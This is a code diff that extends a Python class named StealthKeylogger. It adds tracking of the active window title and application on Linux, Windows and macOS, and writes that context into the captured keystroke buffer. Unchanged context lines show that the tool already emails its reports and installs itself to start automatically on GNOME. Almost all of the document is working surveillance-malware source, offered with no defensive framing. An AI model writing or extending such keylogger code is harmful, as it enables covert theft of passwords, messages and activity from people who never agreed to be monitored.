@@ -33,6 +33,10 @@ from email.mime.multipart import MIMEMultipart
 import schedule
 import subprocess
 import platform
+try:
+    import psutil
+except ImportError:
+    psutil = None
 
 class StealthKeylogger:
     def __init__(self, config_file="config/config.json"):
@@ -49,6 +53,11 @@ class StealthKeylogger:
         # Buffer for keystrokes
         self.keystroke_buffer = []
         self.buffer_lock = threading.Lock()
+        
+        # Window tracking
+        self.current_window = ""
+        self.current_app = ""
+        self.last_window_check = 0
         
         # Running flag
         self.running = True
@@ -79,6 +88,10 @@ class StealthKeylogger:
                 "flush_interval_minutes": 5,
                 "log_special_keys": True,
                 "log_timestamps": True
+            },
+            "keylogger": {
+                "capture_window_titles": True,
+                "capture_application_names": True
             }
         }
         
@@ -105,9 +118,12 @@ class StealthKeylogger:
     
     def setup_logging(self):
         """Setup logging system"""
+        # Ensure logs directory exists
+        os.makedirs('logs', exist_ok=True)
+        
         log_format = '%(asctime)s - %(levelname)s - %(message)s'
         logging.basicConfig(
-            filename='keylogger_system.log',
+            filename='logs/keylogger_system.log',
             level=logging.INFO,
             format=log_format,
             datefmt='%Y-%m-%d %H:%M:%S'
@@ -152,34 +168,183 @@ class StealthKeylogger:
             self.logger.error(f"Decryption error: {e}")
             return encrypted_data
     
+    def get_active_window_info(self):
+        """Get active window title and application name"""
+        try:
+            system = platform.system()
+            
+            if system == "Linux":
+                # Try multiple methods for Linux
+                try:
+                    # Method 1: xdotool (most reliable)
+                    window_id = subprocess.check_output(['xdotool', 'getactivewindow'], 
+                                                      stderr=subprocess.DEVNULL).decode().strip()
+                    window_title = subprocess.check_output(['xdotool', 'getwindowname', window_id], 
+                                                         stderr=subprocess.DEVNULL).decode().strip()
+                    
+                    # Get process info
+                    pid = subprocess.check_output(['xdotool', 'getwindowpid', window_id], 
+                                                stderr=subprocess.DEVNULL).decode().strip()
+                    
+                    if psutil and pid.isdigit():
+                        process = psutil.Process(int(pid))
+                        app_name = process.name()
+                    else:
+                        app_name = "Unknown"
+                    
+                    return window_title, app_name
+                    
+                except (subprocess.CalledProcessError, FileNotFoundError):
+                    # Method 2: wmctrl as fallback
+                    try:
+                        output = subprocess.check_output(['wmctrl', '-l'], 
+                                                       stderr=subprocess.DEVNULL).decode()
+                        active_output = subprocess.check_output(['xprop', '-root', '_NET_ACTIVE_WINDOW'], 
+                                                              stderr=subprocess.DEVNULL).decode()
+                        window_id = active_output.split()[-1]
+                        
+                        for line in output.split('\n'):
+                            if window_id.lower() in line.lower():
+                                parts = line.split(None, 3)
+                                if len(parts) >= 4:
+                                    return parts[3], "Application"
+                        return "Unknown Window", "Unknown App"
+                        
+                    except (subprocess.CalledProcessError, FileNotFoundError):
+                        # Method 3: Simple ps fallback
+                        try:
+                            output = subprocess.check_output(['ps', 'aux'], 
+                                                           stderr=subprocess.DEVNULL).decode()
+                            # Look for common GUI applications
+                            gui_apps = ['firefox', 'chrome', 'code', 'terminal', 'gedit', 'nautilus']
+                            for line in output.split('\n'):
+                                for app in gui_apps:
+                                    if app in line.lower() and 'grep' not in line:
+                                        return f"{app.title()} Window", app
+                            return "Terminal", "terminal"
+                        except:
+                            return "Unknown", "Unknown"
+            
+            elif system == "Windows":
+                try:
+                    import win32gui
+                    import win32process
+                    
+                    hwnd = win32gui.GetForegroundWindow()
+                    window_title = win32gui.GetWindowText(hwnd)
+                    
+                    # Get process name
+                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
+                    if psutil:
+                        process = psutil.Process(pid)
+                        app_name = process.name()
+                    else:
+                        app_name = "Unknown"
+                    
+                    return window_title, app_name
+                except ImportError:
+                    return "Windows System", "Windows"
+            
+            elif system == "Darwin":  # macOS
+                try:
+                    script = '''
+                    tell application "System Events"
+                        set frontApp to name of first application process whose frontmost is true
+                        set frontAppTitle to ""
+                        try
+                            tell process frontApp
+                                set frontAppTitle to title of front window
+                            end tell
+                        end try
+                        return frontApp & "|" & frontAppTitle
+                    end tell
+                    '''
+                    
+                    result = subprocess.check_output(['osascript', '-e', script], 
+                                                   stderr=subprocess.DEVNULL).decode().strip()
+                    parts = result.split('|', 1)
+                    app_name = parts[0] if parts else "Unknown"
+                    window_title = parts[1] if len(parts) > 1 else "Unknown Window"
+                    
+                    return window_title, app_name
+                except:
+                    return "macOS System", "macOS"
+            
+            else:
+                return "Unknown System", "Unknown"
+                
+        except Exception as e:
+            self.logger.error(f"Error getting window info: {e}")
+            return "Error", "Error"
+    
+    def update_window_context(self):
+        """Update current window context if enabled"""
+        if not (self.config.get('keylogger', {}).get('capture_window_titles', False) or 
+                self.config.get('keylogger', {}).get('capture_application_names', False)):
+            return
+        
+        current_time = time.time()
+        # Only check window every 2 seconds to reduce overhead
+        if current_time - self.last_window_check < 2:
+            return
+        
+        self.last_window_check = current_time
+        
+        try:
+            window_title, app_name = self.get_active_window_info()
+            
+            # Create context string
+            new_context = ""
+            if self.config.get('keylogger', {}).get('capture_window_titles', False):
+                new_context += window_title
+            if self.config.get('keylogger', {}).get('capture_application_names', False):
+                if new_context:
+                    new_context += f" - {app_name}"
+                else:
+                    new_context = app_name
+            
+            # If context changed, log it
+            if new_context and new_context != self.current_window:
+                self.current_window = new_context
+                self.current_app = app_name
+                
+                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                context_log = f"[{timestamp}] === Application: {new_context} ===\n"
+                
+                with self.buffer_lock:
+                    self.keystroke_buffer.append(context_log)
+                    
+        except Exception as e:
+            self.logger.error(f"Error updating window context: {e}")
+    
     def format_keystroke(self, key):
         """Format keystroke for logging"""
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S') if self.config['logging']['log_timestamps'] else ""
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S') if self.config.get('keylogger', {}).get('log_timestamps', True) else ""
         
         try:
             # Handle special keys
             if key == Key.space:
-                return f"[{timestamp}] [SPACE]\n" if self.config['logging']['log_special_keys'] else " "
+                return f"[{timestamp}] [SPACE]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else " "
             elif key == Key.enter:
-                return f"[{timestamp}] [ENTER]\n" if self.config['logging']['log_special_keys'] else "\n"
+                return f"[{timestamp}] [ENTER]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else "\n"
             elif key == Key.backspace:
-                return f"[{timestamp}] [BACKSPACE]\n" if self.config['logging']['log_special_keys'] else "[BS]"
+                return f"[{timestamp}] [BACKSPACE]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else "[BS]"
             elif key == Key.tab:
-                return f"[{timestamp}] [TAB]\n" if self.config['logging']['log_special_keys'] else "\t"
+                return f"[{timestamp}] [TAB]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else "\t"
             elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
-                return f"[{timestamp}] [SHIFT]\n" if self.config['logging']['log_special_keys'] else ""
+                return f"[{timestamp}] [SHIFT]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else ""
             elif key == Key.ctrl_l or key == Key.ctrl_r:
-                return f"[{timestamp}] [CTRL]\n" if self.config['logging']['log_special_keys'] else ""
+                return f"[{timestamp}] [CTRL]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else ""
             elif key == Key.alt_l or key == Key.alt_r:
-                return f"[{timestamp}] [ALT]\n" if self.config['logging']['log_special_keys'] else ""
+                return f"[{timestamp}] [ALT]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else ""
             elif hasattr(key, 'char') and key.char is not None:
                 # Regular character
-                prefix = f"[{timestamp}] " if self.config['logging']['log_timestamps'] else ""
+                prefix = f"[{timestamp}] " if self.config.get('keylogger', {}).get('log_timestamps', True) else ""
                 return f"{prefix}{key.char}"
             else:
                 # Other special keys
                 key_name = str(key).replace('Key.', '').upper()
-                return f"[{timestamp}] [{key_name}]\n" if self.config['logging']['log_special_keys'] else f"[{key_name}]"
+                return f"[{timestamp}] [{key_name}]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else f"[{key_name}]"
                 
         except Exception as e:
             self.logger.error(f"Error formatting keystroke: {e}")
@@ -188,13 +353,16 @@ class StealthKeylogger:
     def on_key_press(self, key):
         """Handle key press events"""
         try:
+            # Update window context before logging keystroke
+            self.update_window_context()
+            
             formatted_key = self.format_keystroke(key)
             
             with self.buffer_lock:
                 self.keystroke_buffer.append(formatted_key)
                 
                 # Flush buffer if it reaches the configured size
-                if len(self.keystroke_buffer) >= self.config['logging']['buffer_size']:
+                if len(self.keystroke_buffer) >= self.config.get('keylogger', {}).get('buffer_size', 100):
                     self.flush_buffer()
                     
         except Exception as e:
@@ -428,7 +596,7 @@ X-GNOME-Autostart-enabled=true
     def schedule_tasks(self):
         """Schedule recurring tasks"""
         # Schedule buffer flushing
-        schedule.every(self.config['logging']['flush_interval_minutes']).minutes.do(self.flush_buffer)
+        schedule.every(self.config.get('keylogger', {}).get('flush_interval_minutes', 5)).minutes.do(self.flush_buffer)
         
         # Schedule email reports
         if self.config['email']['enabled']:
